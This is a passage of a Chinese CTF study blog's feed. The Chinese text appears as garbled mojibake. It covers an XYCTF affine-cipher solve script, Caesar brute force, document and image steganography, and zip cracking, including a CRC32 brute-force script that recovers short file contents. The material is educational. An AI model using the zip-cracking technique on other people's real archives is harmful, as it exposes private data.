class="hljs-number">18491445</span>, <span class="hljs-number">9179655</span>, <span class="hljs-number">1033969</span>, <span class="hljs-number">15584706</span>, <span class="hljs-number">3366177</span>, <span class="hljs-number">8605124</span>, <span class="hljs-number">459438</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">2808688</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">2808688</span>, <span class="hljs-number">17933956</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">4549323</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(enc))<br>ans = []<br>a_ans = []<br>b_ans = []<br><span class="hljs-keyword">for</span> c_i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-keyword">for</span> c_j <span class="hljs-keyword">in</span> enc:<br>        <span class="hljs-keyword">if</span> c_i!=c_j:<br>            c = c_i - c_j<br>            ci = c_i           <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>                    m = table.index(i) - table.index(j)<br>                    <span class="hljs-keyword">if</span> GCD(m,p) == <span class="hljs-number">1</span>:<br>                        inv_m = inverse(m,p)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">continue</span><br>                    a = c * inv_m % p<br>                    b = (ci - a * table.index(i)) % p<br>                    <span class="hljs-keyword">if</span> <span class="hljs-number">1145140</span> &lt;= a &lt;= <span class="hljs-number">19198100</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1145140</span> &lt;= b &lt;= <span class="hljs-number">19198100</span>:<br>                        ans_i=<span class="hljs-string">&quot;&quot;</span><br>                        <span class="hljs-keyword">if</span> GCD(a,p):<br>                            inv_a = inverse(a,p)<br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">continue</span><br>                        <span class="hljs-comment">#print(inv_a)</span><br>                        <span class="hljs-keyword">for</span> ci <span class="hljs-keyword">in</span> enc:<br>                            mi = ((ci - b)*inv_a) % p<br>                            <span class="hljs-keyword">if</span> mi &lt; <span class="hljs-built_in">len</span>(table):<br>                                m = table[mi]<br>                                ans_i += m<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> mi &gt;= <span class="hljs-built_in">len</span>(table):<br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">if</span> ans_i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ans:<br>                                a_ans.append(a)<br>                                b_ans.append(b)<br>                                ans.append(ans_i)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ans)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a=&quot;</span>,a_ans[i],<span class="hljs-string">&quot;b=&quot;</span>,b_ans[i],<span class="hljs-string">&quot;XYCTF&#123;&quot;</span>+ans[i] + <span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>ç»“æœåˆ†æï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">36<br>a= 15125268 b= 2808688 XYCTF&#123;iifeif41M56UV1WQ1RRV69W35SVPRiaiabij&#125;<br>a= 4072843 b= 3940708 XYCTF&#123;114514fixedpointissodangerous1919810&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œå­˜åœ¨ä¸¤ç»„åˆé€‚çš„ç»“æœï¼Œå…¶å®åªæœ‰ç¬¬äºŒä¸ªæ‰æ˜¯æ­£ç¡®flagï¼Œåˆ°æ­¤åº”è¯¥å¯ä»¥çŒœå‡ºæ¥ï¼Œè¿™ç§æ–¹å¼åº”è¯¥ä¸ºéé¢„æœŸè§£ï¼Œç½‘ä¸Šçš„è¯¸å¤š$GCD$æ–¹å¼æ±‚aï¼Œå…¶å®ä¹Ÿä¸èƒ½å¾ˆå¥½åœ°æ±‚å‡ºç»“æœï¼Œéƒ½æ˜¯éé¢„æœŸè§£ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>XYCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CryptoåŸºç¡€ç¯‡-å¤å…¸å¯†ç </title>
    <link href="/2025/04/14/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    <url>/2025/04/14/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="caesarå¯†ç ï¼ˆå‡¯æ’’å¯†ç ï¼‰"><a href="#caesarå¯†ç ï¼ˆå‡¯æ’’å¯†ç ï¼‰" class="headerlink" title="caesarå¯†ç ï¼ˆå‡¯æ’’å¯†ç ï¼‰"></a>caesarå¯†ç ï¼ˆå‡¯æ’’å¯†ç ï¼‰</h1><p><strong>ä»‹ç»ï¼š</strong> å°†å­—æ¯è¡¨å¾ªç¯ç§»<code>n</code>ä½ã€‚<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å‡¯æ’’çˆ†ç ´</span><br>cipher=<span class="hljs-string">&quot;AFFPGS&#123;pbatenghyngvbaf!!!&#125;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):<br>Â  Â  ans=<span class="hljs-string">&quot;&quot;</span><br>Â  Â  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> cipher:<br>Â  Â  Â  Â  <span class="hljs-keyword">if</span> j.isalpha():<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> j.islower():<br>Â  Â  Â  Â  Â  Â  Â  Â  ans += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+i)%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">elif</span> j.isupper():<br>Â  Â  Â  Â  Â  Â  Â  Â  ans += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+i)%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>Â  Â  Â  Â  <span class="hljs-keyword">else</span>:<br>Â  Â  Â  Â  Â  Â  ans +=j<br>Â  Â  <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;shitf<span class="hljs-subst">&#123;i&#125;</span>:&quot;</span> +ans)<br></code></pre></td></tr></table></figure><h1 id="å…«å¦"><a href="#å…«å¦" class="headerlink" title="å…«å¦"></a>å…«å¦</h1><p><strong>ä»‹ç»ï¼š</strong> æ–¹ä½ç¬¦å·</p><ul><li><strong>ä¹¾ï¼ˆqiÃ¡nï¼‰</strong>ï¼šä»£è¡¨å¤©ï¼Œç¬¦å·ä¸ºä¸‰é˜³çˆ»ï¼ˆâ˜°ï¼‰</li><li><strong>å¤ï¼ˆkÅ«nï¼‰</strong>ï¼šä»£è¡¨åœ°ï¼Œç¬¦å·ä¸ºä¸‰é˜´çˆ»ï¼ˆâ˜·ï¼‰</li><li><strong>éœ‡ï¼ˆzhÃ¨nï¼‰</strong>ï¼šä»£è¡¨é›·ï¼Œç¬¦å·ä¸ºä¸€é˜³çˆ»åœ¨ä¸‹ï¼Œä¸¤é˜´çˆ»åœ¨ä¸Šï¼ˆâ˜³ï¼‰</li><li><strong>å·½ï¼ˆxÃ¹nï¼‰</strong>ï¼šä»£è¡¨é£ï¼Œç¬¦å·ä¸ºä¸€é˜´çˆ»åœ¨ä¸‹ï¼Œä¸¤é˜³çˆ»åœ¨ä¸Šï¼ˆâ˜´ï¼‰</li><li><strong>åï¼ˆkÇnï¼‰</strong>ï¼šä»£è¡¨æ°´ï¼Œç¬¦å·ä¸ºä¸€é˜³çˆ»åœ¨ä¸­é—´ï¼Œä¸¤é˜´çˆ»åœ¨ä¸Šä¸‹ï¼ˆâ˜µï¼‰</li><li><strong>ç¦»ï¼ˆlÃ­ï¼‰</strong>ï¼šä»£è¡¨ç«ï¼Œç¬¦å·ä¸ºä¸€é˜´çˆ»åœ¨ä¸­é—´ï¼Œä¸¤é˜³çˆ»åœ¨ä¸Šä¸‹ï¼ˆâ˜²ï¼‰</li><li><strong>è‰®ï¼ˆgÃ¨nï¼‰</strong>ï¼šä»£è¡¨å±±ï¼Œç¬¦å·ä¸ºä¸¤é˜³çˆ»åœ¨ä¸‹ï¼Œä¸€é˜´çˆ»åœ¨ä¸Šï¼ˆâ˜¶ï¼‰</li><li><strong>å…‘ï¼ˆduÃ¬ï¼‰</strong>ï¼šä»£è¡¨æ³½ï¼Œç¬¦å·ä¸ºä¸¤é˜´çˆ»åœ¨ä¸‹ï¼Œä¸€é˜³çˆ»åœ¨ä¸Šï¼ˆâ˜±ï¼‰</li></ul><p><strong>åˆ†æï¼š</strong> å°†é˜³çˆ»ï¼ˆyaoï¼‰çœ‹ä½œâ€1â€ï¼Œé˜´çˆ»çœ‹ä½œâ€œ0â€ã€‚ä¹‹åå½“ä½œäºŒè¿›åˆ¶æ¥åšã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>å¤å…¸å¯†ç </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCåŸºç¡€ç¯‡-æ–‡æ¡£éšå†™</title>
    <link href="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/"/>
    <url>/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="wordæ–‡æ¡£"><a href="#wordæ–‡æ¡£" class="headerlink" title="wordæ–‡æ¡£"></a>wordæ–‡æ¡£</h1><h2 id="1-å­—ä½“é¢œè‰²"><a href="#1-å­—ä½“é¢œè‰²" class="headerlink" title="1.å­—ä½“é¢œè‰²"></a>1.å­—ä½“é¢œè‰²</h2><p>wordæ–‡æ¡£ä¸­ï¼Œå­—ä½“é¢œè‰²è¢«è°ƒä¸ºç™½è‰²ï¼Œå…¨é€‰å¯ä»¥çœ‹åˆ°æ˜¯å¦æœ‰éšè—æ–‡å­—ï¼Œç„¶åæ”¹å˜å­—ä½“é¢œè‰²å³å¯çœ‹åˆ°éšè—æ–‡å­—ã€‚</p><h2 id="2-éšè—æ–‡å­—"><a href="#2-éšè—æ–‡å­—" class="headerlink" title="2.éšè—æ–‡å­—"></a>2.éšè—æ–‡å­—</h2><p>åœ¨å­—ä½“è®¾ç½®ä¸­èƒ½å¤Ÿé€‰æ‹©éšè—æ–‡å­—ã€‚<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250506115019989.png"><br>æŸ¥çœ‹æ–¹å¼ï¼š<br>åœ¨<code>æ–‡ä»¶-æ›´å¤š-é€‰é¡¹-æ˜¾ç¤º</code>ä¸­å¼€å¯æ˜¾ç¤ºéšè—æ–‡å­—<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250506115221585.png"></p><h2 id="3-éšè—å›¾ç‰‡"><a href="#3-éšè—å›¾ç‰‡" class="headerlink" title="3.éšè—å›¾ç‰‡"></a>3.éšè—å›¾ç‰‡</h2><p>åœ¨<code>é€‰é¡¹-é«˜çº§-æ˜¾ç¤ºæ–‡æ¡£å†…å®¹ä¸­</code>ï¼Œå…³é—­å›¾ä¸­é€‰é¡¹ï¼Œä¾¿èƒ½éšè—å›¾ç‰‡å’Œæ–‡æœ¬æ¡†ã€‚<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250506115628388.png"></p><h2 id="4-é›¶å®½åº¦å­—ç¬¦éšå†™"><a href="#4-é›¶å®½åº¦å­—ç¬¦éšå†™" class="headerlink" title="4.é›¶å®½åº¦å­—ç¬¦éšå†™"></a>4.é›¶å®½åº¦å­—ç¬¦éšå†™</h2><p>è§æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://ramoor.github.io/2025/02/28/Misc%E9%9A%8F%E7%AC%94/">Miscéšç¬” - Ramoor</a></p><h2 id="5-pdfæ–‡æ¡£éšå†™"><a href="#5-pdfæ–‡æ¡£éšå†™" class="headerlink" title="5.pdfæ–‡æ¡£éšå†™"></a>5.pdfæ–‡æ¡£éšå†™</h2><p><strong>ä¸‹è½½åœ°å€ï¼š</strong> <a href="https://www.bailer.at/wbstego/">wbStego Steganography Tool</a><br><strong>éšå†™æ–‡ä»¶ï¼š</strong> é™¤PDFæ–‡ä»¶ä¹‹å¤–ï¼Œè¿˜æœ‰BMPã€TXTã€HTMLæ–‡ä»¶</p><blockquote><p>å¯ä»¥è®¾ç½®å¯†ç ï¼Œè‹¥æ— å¯†ç åˆ™ä¿æŒä¸ºç©º</p></blockquote><p><strong>æ³¨æ„ï¼š</strong> è‹¥å‡ºç°å¦‚ä¸‹æŠ¥é”™<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250514214338312.png"><br>å¤§æ¦‚ç‡æ˜¯æ–‡ä»¶è¢«å¦ä¸€ä¸ªç¨‹åºæ‰“å¼€äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>æ–‡æ¡£éšå†™</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCåŸºç¡€ç¯‡-å‹ç¼©åŒ…</title>
    <link href="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <url>/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="éšç¬”-æ›´æ–°ä¸­â€¦"><a href="#éšç¬”-æ›´æ–°ä¸­â€¦" class="headerlink" title="éšç¬”(æ›´æ–°ä¸­â€¦)"></a>éšç¬”(æ›´æ–°ä¸­â€¦)</h2><ul><li>zipä¼ªåŠ å¯†</li><li>å¯†ç çˆ†ç ´ï¼Œæ¨èä½¿ç”¨<code>ArchPR</code>å·¥å…·</li><li>è§£å‹ç¼©å·¥å…·æ‰“å¼€ï¼Œçœ‹åˆ°éšè—ä¿¡æ¯</li><li>åŠ å¯†å‹ç¼©åŒ…å†…å¹¶ä¸æ˜¯æ‰€æœ‰æ–‡ä»¶éƒ½åŠ å¯†ï¼Œä¹Ÿå¹¶ä¸æ˜¯åŠ å¯†çš„å¯†ç éƒ½ä¸€æ ·ã€‚</li><li>CRC32æ”»å‡»</li></ul><h2 id="CRC32æ”»å‡»"><a href="#CRC32æ”»å‡»" class="headerlink" title="CRC32æ”»å‡»"></a>CRC32æ”»å‡»</h2><p><strong>CRC32ï¼š</strong> CRCæ˜¯<strong>å†—ä½™æ ¡éªŒç </strong>ã€‚CRC32æ˜¯ä¸€ä¸ª32bitçš„æ ¡éªŒå€¼ï¼Œè®¡ç®—è¿™ä¸ªå€¼æ—¶æºæ•°æ®å—çš„æ¯ä¸€ä¸ªbitéƒ½å‚ä¸è®¡ç®—ã€‚</p><p><strong>zipæ–‡ä»¶ä¸­çš„CRC32æ”»å‡»ï¼š</strong> ç”±äºzipæ–‡ä»¶ä¸­ä¿ç•™äº†åŸå§‹æ–‡ä»¶çš„CRC32æ ¡éªŒç ï¼Œå› æ­¤ï¼Œå€˜è‹¥æºæ–‡ä»¶æ•°æ®è¾ƒå°ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡çˆ†ç ´æ˜æ–‡å†…å®¹çš„æ–¹å¼æ¥ç ´è§£zipæ–‡ä»¶ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong> é€‚åˆæ”»å‡»å¯†é’¥è¾ƒé•¿ã€å†…å®¹è¾ƒå°‘çš„æƒ…å†µ</p><p><strong>ä»£ç å®ç°ç¤ºä¾‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;flag.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br><br><span class="hljs-comment"># è·å–æ–‡ä»¶åˆ—è¡¨</span><br>file_list = z.namelist()<br><span class="hljs-built_in">print</span>(file_list)<br><br><span class="hljs-comment"># è·å–æºæ–‡ä»¶çš„CRC32æ ¡éªŒç </span><br>CRC=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file_list:<br>    CRC.append(z.getinfo(i).CRC)<br><span class="hljs-built_in">print</span>(CRC)<br><br><span class="hljs-comment"># çˆ†ç ´è®¡ç®—CRC32ï¼Œè¿™é‡Œä»¥å¤šä¸ª1å­—èŠ‚æºæ–‡ä»¶çš„é¢˜ç›®ä¸ºä¾‹</span><br>key = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> crc <span class="hljs-keyword">in</span> CRC:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-keyword">if</span> binascii.crc32(i.encode()) == crc:<br>            key += i<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>å‹ç¼©åŒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCåŸºç¡€ç¯‡-å›¾ç‰‡éšå†™</title>
    <link href="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <url>/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡ä¸»è¦å¯¹miscä¸­å›¾ç‰‡éšå†™ä¸­çš„<strong>å¸¸è€ƒç‚¹</strong>ä»¥åŠç»å…¸<strong>è§£é¢˜æ€è·¯</strong>è¿›è¡Œæ€»ç»“ã€‚</p><h2 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><ul><li>æ–‡ä»¶ç±»å‹åˆ¤æ–­</li><li>exiféšå†™</li><li>æ–‡ä»¶æå–</li><li>å›¾ç‰‡å®½é«˜</li><li>JPEGéšå†™</li><li>PNGéšå†™</li><li>LSBéšå†™</li><li>ç›²æ°´å°</li><li>GIFéšå†™</li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="1-æ–‡ä»¶ç±»å‹åˆ¤æ–­"><a href="#1-æ–‡ä»¶ç±»å‹åˆ¤æ–­" class="headerlink" title="1.æ–‡ä»¶ç±»å‹åˆ¤æ–­"></a>1.æ–‡ä»¶ç±»å‹åˆ¤æ–­</h3><ul><li><strong>010editor</strong> åˆ†ææ–‡ä»¶å¤´å°¾ï¼ˆå¯å†å¦ä¸€ç¯‡åšå®¢æŸ¥çœ‹æ–‡ä»¶å¤´æ€»ç»“ï¼‰</li><li><strong>Linux</strong>ä¸­ä½¿ç”¨<code>file xxx</code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç±»å‹</li><li><strong>Windows</strong>ä¸­ä½¿ç”¨<code>TrlDNET</code>å·¥å…·æŸ¥çœ‹æ–‡ä»¶ç±»å‹</li></ul><h2 id="2-exiféšå†™"><a href="#2-exiféšå†™" class="headerlink" title="2.exiféšå†™"></a>2.exiféšå†™</h2><ul><li>å³é”®å±æ€§æŸ¥çœ‹ï¼ˆä¿¡æ¯æœ‰é™ï¼‰</li><li><strong>exiftool</strong>æŸ¥çœ‹ï¼š<code>exiftool xxx(æ–‡ä»¶å)</code></li></ul><h2 id="3-æ–‡ä»¶æå–"><a href="#3-æ–‡ä»¶æå–" class="headerlink" title="3.æ–‡ä»¶æå–"></a>3.æ–‡ä»¶æå–</h2><h3 id="æ‰¾åˆ°éšè—æ–‡ä»¶"><a href="#æ‰¾åˆ°éšè—æ–‡ä»¶" class="headerlink" title="æ‰¾åˆ°éšè—æ–‡ä»¶"></a>æ‰¾åˆ°éšè—æ–‡ä»¶</h3><ul><li><strong>010Editorï¼š</strong> å¦‚æœç†Ÿæ‚‰å„ç§æ–‡ä»¶ç±»å‹ç‰¹ç‚¹ï¼Œå¯ç›´æ¥æŸ¥çœ‹<strong>å­—ç¬¦ä¸²</strong>æ¥æŸ¥æ‰¾éšè—æ–‡ä»¶ã€‚</li><li><strong>å‹ç¼©å·¥å…·ï¼š</strong> ç›´æ¥ç”¨å¦‚ <strong>Bandzipã€7Z</strong>ç­‰æ‰“å¼€å›¾ç‰‡ï¼Œå¯ç›´æ¥æŸ¥çœ‹éšè—æ–‡ä»¶ã€‚</li><li><strong>Binwalkï¼š</strong> ä½¿ç”¨<code>binwalk xxx</code>ç›´æ¥æŸ¥çœ‹éšè—æ–‡ä»¶</li></ul><h3 id="åˆ†ç¦»éšè—æ–‡ä»¶"><a href="#åˆ†ç¦»éšè—æ–‡ä»¶" class="headerlink" title="åˆ†ç¦»éšè—æ–‡ä»¶"></a>åˆ†ç¦»éšè—æ–‡ä»¶</h3><ul><li><strong>å¤åˆ¶æ•°æ®ï¼š</strong> å¦‚æœåœ¨010Editoræˆ–å…¶ä»–åœ°æ–¹æ‰¾åˆ°éšè—æ–‡ä»¶ï¼Œå¹¶ç¡®å®šäº†å¤´ã€å°¾ï¼Œå¯ä»¥é€šè¿‡ä¿å­˜æ•°æ®ä¸ºæ–°æ–‡ä»¶æ¥åˆ†ç¦»å‡ºéšè—æ–‡ä»¶ã€‚</li><li><strong>è§£å‹å·¥å…·ï¼š</strong> è§£å‹å·¥å…·èƒ½å¤Ÿç›´æ¥è§£å‹ç¼©å›¾ç‰‡ä¸­çš„éšè—æ–‡ä»¶ã€‚</li><li><strong>Foremostï¼š</strong> ä½¿ç”¨<code>foremost xxx</code>æ¥åˆ†ç¦»éšè—æ–‡ä»¶ï¼Œä¸å¤ªæ¨èä½¿ç”¨<code>binwalk -e xxx</code>ï¼Œæœ¬äººå®é™…åº”ç”¨ä¸­ä¼šé‡è§foremoståˆ†ç¦»å‡ºæ–‡ä»¶è€Œbinwalkåˆ†ç¦»ä¸å‡ºçš„æƒ…å†µã€‚</li></ul><h2 id="4-ä¿®æ”¹å›¾ç‰‡å®½é«˜"><a href="#4-ä¿®æ”¹å›¾ç‰‡å®½é«˜" class="headerlink" title="4.ä¿®æ”¹å›¾ç‰‡å®½é«˜"></a>4.ä¿®æ”¹å›¾ç‰‡å®½é«˜</h2><h3 id="PNGå›¾ç‰‡"><a href="#PNGå›¾ç‰‡" class="headerlink" title="PNGå›¾ç‰‡"></a>PNGå›¾ç‰‡</h3><p>å®½ï¼š<code>0010h ~ 0013h</code><br>é«˜ï¼š<code>0014h ~ 0017h</code><br>CRCï¼ˆå¾ªç¯å†—ä½™æ£€æµ‹ï¼‰ï¼š<code>001dh ~ 0020h</code><br>å¯é€šè¿‡çˆ†ç ´CRCæ¥æ¢å¤åŸå›¾ç‰‡å®½é«˜ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å›¾ç‰‡CRCæ ¡éªŒ</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crc32_hex = <span class="hljs-number">0x2044BBCE</span> <span class="hljs-comment">#å›¾ç‰‡CRCå€¼</span><br><br>filename = <span class="hljs-string">&#x27;xxx.png&#x27;</span> <span class="hljs-comment">##å›¾ç‰‡è·¯å¾„</span><br>crcbp = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>Â  Â  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>Â  Â  Â  Â  data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>Â  Â  Â  Â  Â  Â  struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>Â  Â  Â  Â  crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>Â  Â  Â  Â  <span class="hljs-keyword">if</span>(crc32 == crc32_hex):<br>Â  Â  Â  Â  Â  Â  <span class="hljs-built_in">print</span>(i, j)<br>Â  Â  Â  Â  Â  Â  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wid:&#x27;</span>, <span class="hljs-built_in">hex</span>(i))<br>Â  Â  Â  Â  Â  Â  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hight:&#x27;</span>, <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure><h2 id="JPGå›¾ç‰‡"><a href="#JPGå›¾ç‰‡" class="headerlink" title="JPGå›¾ç‰‡"></a>JPGå›¾ç‰‡</h2><p>é«˜ï¼šåœ¨<code>FF CO/C2</code>æ•°æ®ä¹‹åçš„ <strong>ç¬¬4ã€ç¬¬5ä¸ª</strong>å­—èŠ‚ã€‚<br>å®½ï¼šåœ¨<strong>é«˜ä¹‹å</strong>çš„ä¸¤ä¸ªå­—èŠ‚ã€‚<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/file-20250410173839147.png"></p><blockquote><p>å¦‚å›¾å„ä¸ªå—ï¼š<br><code>1:</code>èµ·å§‹å¤´<br><code>2:</code>æ•°æ®é•¿åº¦<br><code>3:</code>æ•°æ®ç²¾åº¦<br><code>4:</code>é«˜<br><code>5:</code>å®½</p></blockquote><h3 id="BMPå›¾ç‰‡"><a href="#BMPå›¾ç‰‡" class="headerlink" title="BMPå›¾ç‰‡"></a>BMPå›¾ç‰‡</h3><p>å®½ï¼š<code>0012h ~ 0015h</code><br>é«˜ï¼š<code>0016h ~ 0019h</code></p><h2 id="JPEGéšå†™"><a href="#JPEGéšå†™" class="headerlink" title="JPEGéšå†™"></a>JPEGéšå†™</h2><p>jstegã€JPHSï¼ˆJPHide &amp; JPSeekï¼‰ã€outguess 01.3bã€steghide 0.4ã€stegbreakã€camouflageã€appendxå’Œwbirchã€‚</p><h3 id="1-JPHSï¼ˆJPHide-JPSeekï¼‰"><a href="#1-JPHSï¼ˆJPHide-JPSeekï¼‰" class="headerlink" 